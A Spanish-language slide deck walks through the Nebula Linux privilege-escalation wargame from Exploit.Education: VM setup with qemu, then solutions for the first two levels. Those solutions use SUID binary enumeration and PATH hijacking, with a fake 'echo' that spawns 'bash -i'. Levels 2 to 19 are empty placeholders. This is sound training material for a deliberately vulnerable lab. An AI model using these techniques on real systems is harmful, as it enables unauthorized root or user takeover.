---
title: 'Nebula @ Exploit.Education'
theme: night
highlight-theme: 'monokai'
revealOptions:
    transition: 'fade'
---
## Nebula from Exploit.Education
#### Tony Palma
---


### About Me

Me dedico a la consultoria de TI, casado, 30 años.

> Me gusta/apasiona: 
> - Aprender de seguridad
> - Resolver retos (CTF)
> - FLOSS
> - **HackTheBox**
> - *Tomar un buena taza de café*

---


### Objetivo

> Resolver todos los niveles de Nebula (Exploit.Education)

---


### Pasos generales

0. Leer la documentacion de Nebula en Exploit.Education
1. Descargar el iso de Nebula
2. Crear una VM
3. Resolver cada reto

---


### Exploit.Education

- vulnerability analysis
- exploit development
- software debugging
- binary analysis
- general cyber security issues

---


### Nebula
Nebula es en si una imagen ISO de un sistema operativo con vulnerabilidades simples e intermedias que tienen enfoque en:

- Escalacion de privilegios en Linux
- Problemas comunes sobre scripts
- Condiciones de ejecución en el *file system*
- y más.

En general, es una muy buena maquina para comenzar a explorar vulnerabilidades de Linux.

---


### ISO? Live?

Como mencione anteriormente, Nebula es una imagen ISO por lo que es necesario utilizar un hipervisor para poder ejecutarla. Al iniciar la Maquina Virtual, debemos considerar lo siguiente:

- Memoria: 1G
- vCores: 1 (x86\_64)
- No requiere Hard Drive

---


### Notas (1/2)

Antes de pasar al tema del hipervisor, tengo algunas notas que compartir:

- El usuario por defecto es **nebula:nebula**, usuario y password.
- El usuario `nebula` puede ser root en cualquier momento via `sudo -s`

----


### Notas (2/2)

- Todos los usuarios donde nos enfocaremos tienen el nombre del nivel; level00, level01, etc.
- El objetivo de cada nivel es escalar de levelXX a flagXX; level00 hacia flag00
- Una vez que seamos flagXX debemos ejecutar con exito getflag (nos indicara con un mensaje si hemos tenido exito)

---


### QEMU and KVM

En mi caso particular y como tambien ejercicio de aprendizaje, he utilizado `qemu` como hipervisor, ya que encontre estas rapidas ventajas:

- Un solo comando crea y cuando termina destruye la VM
- Asocio el proceso de la VM con un puerto en el host, que hace NAT hacia el puerto SSH de la VM (Vault)

---


### Download and run

```
$ wget https://github.com/ExploitEducation/Nebula/releases/download/v5.0.0/exploit-exercises-nebula-5.iso
$ sha1sum exploit-exercises-nebula-5.iso | grep e82f807be06100bf3e048f82e899fb1fecc24e3a
$ qemu-system-x86_64 -m 1024 -boot d -cdrom exploit-exercises-nebula-5.iso -vga std -enable-kvm -net nic -net user,hostfwd=tcp::10022-:22
$ ssh nebula@localhost -p10022 
```

---


### Level00

Como este es el nivel inicial, el usuario / contraseña es **level00** / **level00**. El hit que tenemos para el nivel 1 es:

> This level requires you to find a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.

> Alternatively, look at the find man page.

----


### Solution

```
$ find / -perm -4000 -user flag00 2>/dev/null 
# getflag
```

La descripción del reto ya nos decia un poco acerca de donde seguir la pista, debiamos usar el man y buscar como usar `find` para que para encontrar el ejecutable con SUID de flag00 desde root hasta lo mas profundo.

---


### Level01

Ingresamos como user/pass, level01/level01, y nos movemos a la carpeta de /home/flag01, aqui debemos encontrar un binario generado con el siguiente codigo:

```c
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <stdio.h>

int main(int argc, char **argv, char **envp)
{
  gid_t gid;
  uid_t uid;
  gid = getegid();
  uid = geteuid();

  setresgid(gid, gid, gid);
  setresuid(uid, uid, uid);

  system("/usr/bin/env echo and now what?");
}
```

----


### Solution

Como pudimos ver, el binario env ejecuta confiando de las variables, el comando `echo` y le pasa a `echo` los parametros del string que mostrará en pantalla. Abusamos de la variable $PATH que hereda de quien ejecuta el binario (geteuid, getegid) y cambiamos donde encontrara a `echo`. Para ello, `echo` sera un script de `bash` que ejecute bash interactivo (`bash -i`)

```
$ printf '#!/bin/bash\nbash -i' > /tmp/echo && PATH="/tmp/:$PATH" flag01
# getflag
```

---


### Level02

----


### Solution

---


### Level03

----


### Solution

---


### Level04

----


### Solution

---


### Level05

----


### Solution

---


### Level06

----


### Solution

---


### Level07

----


### Solution

---


### Level08

----


### Solution

---


### Level09

----


### Solution

---


### Level10

----


### Solution

---


### Level11

----


### Solution

---


### Level12

----


### Solution

---


### Level13

----


### Solution

---


### Level14

----


### Solution

---


### Level15

----


### Solution

---


### Level16

----


### Solution

---


### Level17

----


### Solution

---


### Level18

----


### Solution

---


### Level19

----


### Solution

---


# Muchas gracias por llegar hasta el ultimo slide
